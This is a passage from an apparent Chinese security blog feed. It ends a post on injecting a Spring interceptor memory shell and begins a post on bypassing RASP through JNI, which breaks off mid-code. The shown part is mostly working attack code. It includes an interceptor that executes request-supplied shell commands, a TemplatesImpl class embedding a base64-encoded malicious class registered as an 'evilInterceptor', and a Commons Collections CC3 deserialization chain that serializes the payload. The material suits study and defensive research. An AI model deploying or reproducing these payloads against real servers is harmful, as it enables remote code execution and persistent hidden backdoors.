&#123;<br>                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, code&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, code&#125;);<br>                &#125;<br>                p.redirectErrorStream(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> p.start();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                StringBuilder results=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>                <span class="hljs-keyword">while</span>((result=r.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>                    results.append(result+<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br>                System.out.println(results);<br>                writer.println(results);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.postHandle(request, response, handler, modelAndView);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.afterCompletion(request, response, handler, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>TemplatesImpl恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorDes</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br>            <span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(AbstractHandlerMapping.class);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQArAoAKABeCABFCwBfAGALAGEAYggAYwoAZABlCgALAGYIAGcKAAsAaAcAaQcAaggAawgAbAoACgBtCABuCABvCgAKAHAKAAoAcQcAcgcAcwoAdAB1CgAUAHYKABMAdwgAeAcAeQoAGQBeCgATAHoKABkAewgAfAoAGQB9CQBkAH4KAH8AgAoAgQCACgCBAIIKAIEAgwcAhAsAKQCFCwApAIYHAIcHAIgHAIkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAPUxvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAFyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVzdWx0cwEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwBqBwCKBwBpBwCHBwCLBwCMBwCIBwCNBwByBwB5BwCEAQAKRXhjZXB0aW9ucwEAEE1ldGhvZFBhcmFtZXRlcnMBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAKU291cmNlRmlsZQEAFFRlc3RJbnRlcmNlcHRvci5qYXZhDAAqACsHAIsMAI4AjwcAjAwAkACRAQAHb3MubmFtZQcAkgwAkwCPDACUAJUBAAN3aW4MAJYAlwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACoAmAEACS9iaW4vYmFzaAEAAi1jDACZAJoMAJsAnAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCNDACdAJ4MACoAnwwAKgCgAQAAAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAKEAlQwAogCjAQACDQoMAKQAlQwApQCmBwCnDACoAKkHAIoMAKoAKwwAqwArAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAVABVDABYAFkBADtvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcgEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABFqYXZhL2xhbmcvUHJvY2VzcwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQATcmVkaXJlY3RFcnJvclN0cmVhbQEAHShaKUxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEABWZsdXNoAQAFY2xvc2UAIQAnACgAAQApAAAABAABACoAKwABACwAAAAvAAEAAQAAAAUqtwABsQAAAAIALQAAAAYAAQAAAAwALgAAAAwAAQAAAAUALwAwAAAAAQAxADIAAwAsAAACJwAGAAsAAADcKxICuQADAgA6BBkExgDOLLkABAEAOgUSBbgABrYABxIItgAJmQAiuwAKWQa9AAtZAxIMU1kEEg1TWQUZBFO3AA46BqcAH7sAClkGvQALWQMSD1NZBBIQU1kFGQRTtwAOOgYZBgS2ABFXGQa2ABI6B7sAE1m7ABRZGQe2ABW3ABa3ABc6CBIYOgm7ABlZtwAaOgoZCLYAG1k6CcYAIBkKuwAZWbcAGhkJtgAcEh22ABy2AB62ABxXp//bsgAfGQq2ACAZBRkKtgAhGQW2ACIZBbYAI6cABToFA6wErAABAA8A0wDWACQAAwAtAAAAVgAVAAAADwAKABAADwASABcAFAAnABUARgAXAGIAGQBpABoAcAAbAIUAHACJAB0AkgAeAJ0AHwC6ACEAwgAiAMkAIwDOACQA0wAmANYAJQDYACcA2gApAC4AAAB6AAwAQwADADMANAAGABcAvAA1ADYABQBiAHEAMwA0AAYAcABjADcAOAAHAIUATgA5ADoACACJAEoAOwA8AAkAkgBBAD0APgAKAAAA3AAvADAAAAAAANwAPwBAAAEAAADcAEEAQgACAAAA3ABDAEQAAwAKANIARQA8AAQARgAAAFUAB/0ARgcARwcASPwAGwcASf8ALwALBwBKBwBLBwBMBwBNBwBHBwBIBwBJBwBOBwBPBwBHBwBQAAAn/wAbAAUHAEoHAEsHAEwHAE0HAEcAAQcAUQEBAFIAAAAEAAEAJABTAAAADQMAPwAAAEEAAABDAAAAAQBUAFUAAwAsAAAAYAAFAAUAAAAKKissLRkEtwAlsQAAAAIALQAAAAoAAgAAAC4ACQAvAC4AAAA0AAUAAAAKAC8AMAAAAAAACgA/AEAAAQAAAAoAQQBCAAIAAAAKAEMARAADAAAACgBWAFcABABSAAAABAABACQAUwAAABEEAD8AAABBAAAAQwAAAFYAAAABAFgAWQADACwAAABgAAUABQAAAAoqKywtGQS3ACaxAAAAAgAtAAAACgACAAAAMwAJADQALgAAADQABQAAAAoALwAwAAAAAAAKAD8AQAABAAAACgBBAEIAAgAAAAoAQwBEAAMAAAAKAFoAWwAEAFIAAAAEAAEAJABTAAAAEQQAPwAAAEEAAABDAAAAWgAAAAEAXAAAAAIAXQ==&quot;</span>;<br>            <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.interceptor.TestInterceptor&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>            Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>            <span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> (HandlerInterceptor) constructor.newInstance();<br>            adaptInterceptors.add(evilInterceptor);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>cc3链子</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Interceptor</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//利用反射设置需要满足的值</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;InterceptorDes.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//这里的赋值在序列化的时候就不需要了</span><br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br><span class="hljs-comment">//        Transformer transformer = templates.newTransformer();</span><br>        <span class="hljs-comment">//结合前面的链子串联起来，随便一个都行</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);<br>        annotation.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotation.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotation.newInstance(Override.class, proxyMap);<br>        System.out.println(serialize(o));<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>)).writeObject(obj);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(bytes);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241114162939356.png" alt="image-20241114162939356"></p><p><img src="https://cdn.clown2024.cn/image-20241114163005607.png" alt="image-20241114163005607"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/12047?time__1311=GqGxR70QD=G=itD/YriQGkbvkp6QHKF4D&u_atoken=3b72cba8102056dc353d4296b75d2ed3&u_asig=0a47319217313359997215116e009a">https://xz.aliyun.com/t/12047?time__1311=GqGxR70QD%3DG%3DitD%2FYriQGkbvkp6QHKF4D&amp;u_atoken=3b72cba8102056dc353d4296b75d2ed3&amp;u_asig=0a47319217313359997215116e009a</a></p><p><a href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/code/TouchFilea.java">https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/code/TouchFilea.java</a></p><p><a href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/index.md">https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/index.md</a></p><p><a href="https://forum.butian.net/share/3002">https://forum.butian.net/share/3002</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Spring框架比较常用就不说了，网上大部分都是建一个spring+springmvc的项目来测试内存马，内存马主要的逻辑部分都集中在spr</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>RASP绕过学习</title>
    <link href="https://clowsman.github.io/2024/11/07/RASP%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/11/07/RASP%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-06T16:14:57.000Z</published>
    <updated>2024-11-11T14:43:13.083Z</updated>
    
    <content type="html"><![CDATA[<h1 id="rasp介绍"><a href="#RASP介绍" class="headerlink" title="RASP介绍"></a>RASP介绍</h1><p>RASP全称是Runtime applicaion self-protection，在2014念提出的一种应用程序自我保护技术，将防护功能注入到应用程序之中，通过少量的Hook函数监测程序的运行，根据当前的上下文环境实时阻断攻击事件。</p><p>目前Java RASP主要是通过Instrumentation编写Agent的形式，在Agent的premain和agentmain中加入检测类一般继承于ClassFileTransformer，当程序运行进来的时候，通过类中的transform检测字节码文件中是否有一些敏感的类文件，比如ProcessImpl等。简单的可以理解为通过Instrumentation来对JVM进行实时监控。</p><p>Instrumentation API 提供了两个核心接口：ClassFileTransformer 和 Instrumentation。ClassFileTransformer 接口允许开发者在类加载前或类重新定义时对字节码进行转换。Instrumentation 接口则提供了启动时代理和重新定义类的能力</p><p>Java Agent存在premain和agentmain两个方法，关于这两个方法在之前的java agent也说过了，这里就不再说了</p><p>所以其实就是和前面的文章一样编写一个ClassFileTransformer的实现类，使用该类来对程序进行实时监控，如果检测到相关的危险函数，就通过transform方法来对类字节码进行转化。</p><p>与传统 WAF 对比， RASP 实现更为底层，规则制定更为简单，攻击行为识别更为精准。</p><h1 id="rasp绕过原理"><a href="#RASP绕过原理" class="headerlink" title="RASP绕过原理"></a>RASP绕过原理</h1><p>我们可以知道，RASP主要是通过转换字节码来达到目的，如果设置的检测的方法存在着更底层的方法或者相同层级的不同方法能够达到相同的效果，那么就能完成绕过。</p><p>所以绕过的手法大致为两种：</p><ol><li>寻找没有被限制的类或者函数来绕过，也就是绕过黑名单</li><li>利用更底层的技术进行绕过，例如从 C 代码的层面进行绕过</li></ol><h1 id="jni绕过"><a href="#JNI绕过" class="headerlink" title="JNI绕过"></a>JNI绕过</h1><p>JNI（Java Native Interface）是 Java 提供的一种机制，用于在 Java 程序中调用本地（Native）代码，即使用其他语言（如C、C++）编写的代码，从而可以充分利用本地代码的功能和性能优势，实现对底层系统资源和外部库的访问。</p><p>JNI的设计是为了解决java无法直接访问底层系统资源或者利用本地库的问题，也可以用来绕过RASP。我们编写的代码最后是要编译为dll动态链接库或者so动态共享库，然后JNI通过加载这些共享库来执行我们编写的本地代码</p><p>我们写一个JNI使用dll的例子，写一个执行命令的方法</p><p>java文件</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Command</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">exec</span><span class="hljs-params">(String 